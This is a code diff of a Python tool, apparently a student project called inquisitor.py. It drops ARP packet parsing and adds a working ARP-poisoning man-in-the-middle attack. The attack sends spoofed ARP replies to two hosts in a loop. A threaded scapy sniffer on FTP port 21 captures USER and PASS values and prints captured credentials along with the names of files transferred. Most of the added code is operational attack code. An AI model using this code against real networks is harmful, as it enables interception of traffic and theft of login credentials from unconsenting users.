@@ -1,11 +1,13 @@
 #! /usr/bin/python3
 
 import argparse
-import socket, struct
+import binascii
+import socket
+import struct
 import time
-
-
-ETH_TYPE = 0x0806
+import threading
+from getmac import get_mac_address as gma
+from scapy.all import sniff, Raw
 
 def parser():
     parser = argparse.ArgumentParser(
@@ -33,24 +35,6 @@ def parser():
         help="MAC from target host"
     )
     return parser.parse_args()
-
-
-def create_server_socket():
-    try:
-        server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_TYPE))
-        # server_socket.settimeout(2)
-        return server_socket
-    except PermissionError:
-        print("Error: Network capabilities disabled")
-        print("Try: sudo setcap cap_net_raw+ep inquisitor.py or sudo python inquisitor.py")
-        exit(1)
-    except Exception as e:
-        print(f"Error creating socket: {e}")
-        exit(1)
-
-# Convert byte MAC to str format: ff:ff:ff:ff:ff:ff
-def format_mac(byte_mac):
-    return ':'.join(f'{b:02x}' for b in byte_mac)
 
 
 """
@@ -83,19 +67,6 @@ def format_mac(byte_mac):
 """
 
 
-def parse_eth_header(packet):
-    eth_hdr = packet[:14]
-    eth_fields = struct.unpack("!6s6sH", eth_hdr)
-    eth_dest = eth_fields[0]
-    eth_src = eth_fields[1]
-    eth_type = eth_fields[2]
-
-    print(f"eth_dest: ", format_mac(eth_dest))
-    print(f"eth_src:  ", format_mac(eth_src))
-    print(f"eth_type: ", "ETH_TYPE" if eth_type == ETH_TYPE else eth_type)
-    return eth_type
-
-
 """
     struct.unpack()
 
@@ -107,54 +78,8 @@ def parse_eth_header(packet):
     https://docs.python.org/3/library/struct.html
 """
 
-def parse_arp_packet(packet, addr):
-    arp_packet = packet[14:42]
-    arp_fields = struct.unpack('!HHBBH6s4s6s4s', arp_packet)
-
-    # arp_hdr
-    hw_type = arp_fields[0]
-    proto_type = arp_fields[1]
-    hw_size = arp_fields[2]
-    proto_size = arp_fields[3]
-    opcode = arp_fields[4]
-
-    # sender/target info
-    sender_mac = arp_fields[5]
-    sender_ip = arp_fields[6]
-    target_mac = arp_fields[7]
-    target_ip = arp_fields[8]
-
-    sender_mac_str = format_mac(sender_mac)
-    target_mac_str = format_mac(target_mac)
-    sender_ip_str = socket.inet_ntoa(sender_ip)
-    target_ip_str = socket.inet_ntoa(target_ip)
-
-    OPCODES = { 1: 'REQUEST', 2: 'REPLY' }
-    print(f"\nARP Packet received:")
-    print(f"  Operation: {OPCODES.get(opcode, 'UNKNOWN')}")
-    print(f"  Sender MAC: {sender_mac_str}")
-    print(f"  Sender IP: {sender_ip_str}")
-    print(f"  Target MAC: {target_mac_str}")
-    print(f"  Target IP: {target_ip_str}")
-    print(f"  Interface: {addr[0] if addr else 'unknown'}")
 
 
-def recv_packet(socket):
-    while True:
-        try:
-            packet, addr = socket.recvfrom(1024)
-            # print("PACKET: ", packet)
-            # print("ADR:    ", addr)
-
-            if (parse_eth_header(packet) != ETH_TYPE):
-                continue
-            parse_arp_packet(packet, addr)
-        except Exception as e:
-            print("Error: ", e)
-
-
-from getmac import get_mac_address as gma
-import binascii
 
 # https://docs.huihoo.com/doxygen/linux/kernel/3.7/uapi_2linux_2if__ether_8h.html
 
@@ -163,17 +88,12 @@ ETH_ALEN        = 6 # Octets in one ethernet addr
 # These are the defined Ethernet Protocol ID's.
 ETH_P_IP        = 0x0800 # Internet Protocol packets
 ETH_P_ARP       = 0x0806 # Address Resolution packet
+
 # ARP protocol HARDWARE identifiers
 ARPHRD_ETHER    = 1 # Ethernet 10Mbps
 
 # ARP protocol opcodes.
-ARPOP_REQUEST   = 1
 ARPOP_REPLY     = 2
-ARPOP_RREQUEST  = 3
-ARPOP_RREPLY    = 4
-ARPOP_INREQUEST = 8
-ARPOP_INREPLY   = 9
-ARPOP_NAK       = 10
 
 args = parser()
 
@@ -192,9 +112,6 @@ MAC_SRC = args.SRC_MAC
 MAC_TARGET = args.TARGET_MAC
 MAC_ATTACKER = gma()
 
-print(IP_SRC_STR, IP_SRC_BYTE)
-print(IP_TARGET_STR, IP_TARGET_BYTE)
-
 
 def create_eth_header(mac_target, mac_infected):
     h_dest = binascii.unhexlify(mac_target.replace(':', ''))
@@ -204,7 +121,6 @@ def create_eth_header(mac_target, mac_infected):
         '!6s6sH',
         h_dest, h_source, h_proto
     )
-    # print("ETH_HDR: ", eth_header)
     return eth_header
 
 def create_arp_packet(ip_src, ip_target, mac_target, mac_infected):
@@ -227,7 +143,6 @@ def create_arp_packet(ip_src, ip_target, mac_target, mac_infected):
         ar_sha, ar_sip,
         ar_tha, ar_tip
     )
-    # print("ARP_PACKET: ", arp_packet)
     return arp_packet
 
 def create_sendto_socket():
@@ -243,13 +158,11 @@ def send_packet(ip_src, ip_target, mac_target, mac_infected):
     eth_header = create_eth_header(mac_target, mac_infected)
     arp_packet = create_arp_packet(ip_src, ip_target, mac_target, mac_infected)
     full_arp_packet = eth_header + arp_packet
-    # print("FULL_ARP: ", full_arp_packet)
     sendto_sock = create_sendto_socket()
-    sent = sendto_sock.sendto(
+    sendto_sock.sendto(
         full_arp_packet,
         ("eth0", 0, 0, 0, b'')
     )
-    print(".", end='', flush=True)
     sendto_sock.close()
 
 def poison_target(ip_src, ip_target, mac_target, infected_mac):
@@ -258,27 +171,72 @@ def poison_target(ip_src, ip_target, mac_target, infected_mac):
 
 def restore_arp_tables():
     print(f"Restoring tables...")
-    time.sleep(5)
-    poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_TARGET)
-    poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_SRC)
+    for i in range(0, 10):
+        poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_SRC)
+        poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_TARGET)
+        time.sleep(1)
     print(f"ARP tables restored...")
 
 
-# from scapy.all import sniff, IP, TCP, Raw
+SESSION = {
+    'USER'  : None,
+    'PASS'  : None
+}
+
+def handle_loggin(payload):
+    global SESSION
+
+    if payload.startswith("USER "):
+        SESSION['USER'] = payload.split(" ", 1)[1].strip()
+    if payload.startswith("PASS "):
+        SESSION['PASS'] = payload.split(" ", 1)[1].strip()
+    if 'Login successful.' in payload and SESSION['USER'] != None and SESSION['PASS'] != None:
+        print(f"USER: [{SESSION['USER']}] with PASS: [{SESSION['PASS']}] connected correctly")
+        SESSION['USER'] = None
+        SESSION['PASS'] = None
+    if 'Login incorrect.' in payload and SESSION['USER'] != None and SESSION['PASS'] != None:
+        print(f"USER: [{SESSION['USER']}] with PASS: [{SESSION['PASS']}] coudn't connect")
+        SESSION['USER'] = None
+        SESSION['PASS'] = None
 
 
-# def parse_ftp_packet(packet):
-#     print("parsing ftp...")
-#     if packet.haslayer(Raw):
-#         payload = packet[Raw].load.decode('utf-8', errors='ignore')
-#         print("PAYLOAD: ", payload)
+FTP_INFO = {
+    'FILENAME'  : None,
+    'METHOD'    : None
+}
 
+def handle_ftp(payload):
+    global FTP_INFO
+
+    if payload.startswith("STOR ") or payload.startswith("RETR "):
+        FTP_INFO['FILENAME'] = payload.split(" ", 1)[1].strip()
+        FTP_INFO['METHOD'] = payload.split(" ", 1)[0].strip()
+    if 'Transfer complete.' in payload and FTP_INFO['FILENAME'] != None and FTP_INFO['METHOD'] != None:
+        if FTP_INFO['METHOD'] == 'STOR':
+            print(f"File: [{FTP_INFO['FILENAME']}] sended")
+        if FTP_INFO['METHOD'] == 'RETR':
+            print(f"File: [{FTP_INFO['FILENAME']}] received")
+        FTP_INFO['FILENAME'] = None
+        FTP_INFO['METHOD'] = None
+
+def parse_ftp_packet(packet):
+    if packet.haslayer(Raw):
+        payload = packet[Raw].load.decode('utf-8', errors='ignore')
+        handle_loggin(payload)
+        handle_ftp(payload)
+
+
+def start_sniffer():
+    print(f"Starting FTP sniffer...")
+    sniff(filter="tcp port 21", prn=parse_ftp_packet, store=0)
 
 
 if __name__ == "__main__":
+    sniffer_thread = threading.Thread(target=start_sniffer, daemon=True)
     try:
-        # sniff(filter="tcp port 21", prn=parse_ftp_packet, store=0)
+        sniffer_thread.start()
 
+        print(f"Starting ARP poisoning...")
         while True:
             poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_ATTACKER)
             poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_ATTACKER)
